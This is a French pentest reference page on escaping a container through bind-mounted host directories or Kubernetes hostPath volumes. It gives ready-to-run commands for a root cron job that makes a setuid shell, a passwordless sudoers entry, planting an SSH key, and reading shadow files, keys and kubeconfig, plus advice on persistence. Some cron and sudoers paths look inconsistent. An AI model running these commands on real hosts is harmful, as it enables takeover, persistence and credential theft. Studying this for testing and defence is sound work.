---
title: "Montage de chemin hôte : utiliser un répertoire hôte monté en bind pour atteindre l'hôte"
order: 1
description: "Un conteneur auquel on a donné un montage bind d'un répertoire hôte, ou la racine complète de l'hôte à un chemin tel que /host, peut lire et écrire ces fichiers hôtes directement. Selon le répertoire exposé, un attaquant lit des secrets, écrit une tâche cron ou une clé SSH, modifie une unité systemd, ou escalade via un /etc ou /root monté, la racine complète de l'hôte étant une prise de contrôle immédiate."
keywords:
  - montage hostpath
  - montage bind
  - système de fichiers de l'hôte
  - kubernetes hostpath
  - évasion de conteneur
---

# Montage de chemin hôte

Un montage bind mappe un répertoire hôte dans le conteneur, et les fichiers derrière lui sont les véritables fichiers de l'hôte, pas des copies. La gravité de l'évasion dépend entièrement du répertoire monté et de son caractère accessible en écriture. Un montage de la racine complète de l'hôte à `/host` est une prise de contrôle immédiate ; un montage plus restreint de `/etc`, `/root`, `/var/run`, ou d'un répertoire d'identifiants cloud est souvent tout aussi bon en raison de ce que ces répertoires permettent d'écraser ou de lire. Dans Kubernetes, il s'agit d'un volume `hostPath`, l'une des évasions pod vers nœud les plus courantes.

Trouvez le montage hôte et testez la possibilité d'écriture :

```bash
findmnt -o TARGET,SOURCE,OPTIONS | grep -vE 'overlay|tmpfs|proc|sysfs|cgroup'
# a line whose SOURCE is a host subtree (e.g. /var/lib/..[/host/etc]) is a bind mount
ls -la /host 2>/dev/null; touch /host/etc/.w 2>/dev/null && echo writable
```

## Voies selon ce qui est monté

```bash
# Full host root at /host: chroot straight in
chroot /host /bin/bash

# Host /etc writable: schedule a root job or grant sudo
echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /host/cron.d/w
echo 'nobody ALL=(ALL) NOPASSWD: ALL' > /host/sudoers.d/w

# Host /root or a user home: plant an SSH key
mkdir -p /host/root/.ssh && echo 'ssh-ed25519 AAAA... a' >> /host/root/.ssh/authorized_keys

# Host /var/run or /run: often contains the container runtime socket
ls -l /host/var/run/docker.sock       # pivot to the runtime-socket route

# Read-only mount: still valuable for secrets
cat /host/etc/shadow /host/root/.ssh/id_* /host/etc/kubernetes/admin.conf 2>/dev/null
```

## Notes d'exploitation

- Un montage hôte en lecture seule bloque les écritures mais expose tout de même les secrets ; priorisez les clés privées, `/etc/shadow`, les fichiers kubeconfig et kubelet, ainsi que les fichiers d'identifiants cloud pour la progression ultérieure.
- Préférez une écriture de persistance déterministe (cron, sudoers, authorized_keys) plutôt que la modification d'un binaire ou d'une configuration en cours d'utilisation qu'un service actif maintient ouvert.
- Dans Kubernetes, un `hostPath` de `/` ou `/var/lib/kubelet` est une prise de contrôle du nœud ; voir [montage hostPath](../../orchestration/kubernetes/pod-escape-to-node/hostpath-mount.md) pour la perspective de la livraison par pod.

## Références

- [BishopFox : bad pods / hostPath](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
- [Kubernetes : volumes hostPath](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath)
- [HackTricks : sensitive mounts](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts)
